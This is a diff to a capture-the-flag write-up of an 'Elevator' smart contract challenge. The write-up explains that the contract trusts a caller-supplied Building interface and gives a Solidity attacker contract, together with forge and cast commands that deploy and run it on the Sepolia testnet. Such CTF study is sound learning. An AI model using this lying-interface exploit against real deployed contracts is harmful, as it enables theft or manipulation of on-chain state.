@@ -8,8 +8,9 @@
 <br>
 
 
-* this challenge explores smart contract composability, which can be seen in **ERC standards**, **libraries**, and **interfaces**. 
-  - here, we look at interfaces.
+* this challenge explores vulnerabilities that might come from smart contract composability (usually classified into **ERC standards**, **libraries**, and **interfaces**). 
+
+
 
 <br>
   
@@ -75,7 +76,8 @@ uint public floor;
 
 <br>
 
-* finally, there is one (`public`) function, which simulates the movement of the elevator by first initiating the `building` contract (with the data provided by `msg.sender`) and then taking a `uint _floor` as input representation for "which floor to go":
+* finally, there is one (`public`) function, which simulates the movement of the elevator by first initiating the `building` contract (with the data provided by `msg.sender`) and then taking a `uint _floor` as input representation for "which floor to go",
+  - this challenge's vulnerability is found in this part, due to the unchecked assumption about the caller.
 
 <br>
 
@@ -111,13 +113,12 @@ function goTo(uint _floor) public {
 
 <br>
 
-* we craft the following exploit:
+* an exploit could be crafter with `contract.call(abi.encodeWithSignature("goTo(uint)", 0))`. 
+  - however, since we are leveraging foundry, we craft the following exploit:
 
 <br>
 
 ```solidity
-import {Elevator, Building} from "src/11/Elevator.sol";
-
 contract ElevatorExploit is Building {
     
     uint public lastFloor;
@@ -159,11 +160,12 @@ contract Exploit is Script {
 
             ElevatorExploit exploit = new ElevatorExploit();
             exploit.run(level);
-            assert(level.top());
+            assertTrue(level.top());
 
             vm.stopBroadcast();
     }
 }
+
 ```
 
 <br>
@@ -174,6 +176,43 @@ contract Exploit is Script {
 
 ```shell
 > forge script ./script/11/Elevator.s.sol --broadcast -vvvv --rpc-url sepolia
+```
+
+<br>
+
+---
+
+### solution using `cast` and `forge`
+
+<br>
+
+* another way to submit our exploit is through `cast`. first, we could deploy it with:
+
+<br>
+
+```shell
+> forge create src/11/ElevatorExploit.sol:ElevatorExploit \ 
+  --constructor-args=<level address> --private-key=<private-key> --rpc-url=<sepolia url> 
+```
+
+<br>
+
+* then, we call the contract with:
+
+<br>
+
+```shell
+> cast send <level address> "run()" --gas <extra gas> --private-key=<private-key> --rpc-url=<sepolia url> 
+```
+
+<br>
+
+* finally, we can confirm that `top()` is `true` with:
+
+<br>
+
+```shell
+> cast call <level address>  "top()" --rpc-url=<sepolia url> 
 ```
 
 <br>
